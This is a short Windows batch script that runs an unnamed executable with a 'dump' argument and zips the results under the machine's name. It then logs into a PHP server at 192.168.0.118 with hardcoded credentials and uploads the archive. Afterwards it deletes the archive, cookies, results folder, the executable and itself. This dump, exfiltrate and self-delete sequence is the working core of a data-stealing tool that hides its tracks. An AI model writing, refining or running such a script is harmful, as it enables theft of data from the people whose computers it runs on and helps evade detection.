@echo off
cd /d "%~dp0"
"1.exe" "dump" >nul 2>&1

powershell -Command "Compress-Archive -Path 'results' -DestinationPath 'result_%COMPUTERNAME%.zip' -Force"


curl -c cookies.txt -d "name=alex" -d "pass=123" http://192.168.0.118/Login/login.php


:: Added -F "submit=1" and changed to "file[]" to match your PHP script's expectations
curl -b cookies.txt -F "submit=1" -F "file[]=@result_%COMPUTERNAME%.zip" http://192.168.0.118/Login/upload.php


del "result_%COMPUTERNAME%.zip"
del "cookies.txt"
rmdir /s /q "results"
del /f /q "%~dp01.exe"
del "%~f0"

